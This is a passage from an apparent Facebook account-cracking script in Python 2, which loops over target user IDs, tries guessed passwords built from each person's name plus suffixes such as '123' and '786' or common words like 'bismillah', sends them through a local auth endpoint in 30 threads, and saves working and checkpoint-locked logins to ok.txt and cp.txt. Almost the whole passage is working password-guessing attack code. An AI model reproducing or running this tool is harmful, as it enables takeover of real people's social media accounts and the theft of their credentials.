            pass1 = name + '123'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m'  + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass1
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name + '1234'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass2
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name + '12345'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass3
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name + '786'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass4
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = 'bismillah'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass5
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                pass6 = 'cantik'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass6
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = 'Bangsat'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m'  + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass7
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print '\x1b[1;94m────────────────────────────────────────────────────'
    print '\x1b[1;96m Process Has Completed'
    print '\x1b[1;97m Total\x1b[1;93m CP\x1b[1;91m/\x1b[1;92mOK \x1b[1;91m: \x1b[1;93m' + str(len(cps)) + '\x1b[1;91m/\x1b[1;92m' + str(len(oks))
    jalan('\x1b[1;97m RESULTS \x1b[1;93mCP\x1b[1;91m/\x1b[1;92mOK\x1b[1;97m SAVED TO SDCARD\x1b[1;91m : \x1b[1;93mcp.txt\x1b[1;91m/\x1b[1;92mok.txt')
    print '\x1b[1;94m────────────────────────────────────────────────────'
    print ''
    raw_input('\x1b[1;96m Press Entet To Back ')
    moch_yayan()


if __name__ == '__main__':
    kanjut()
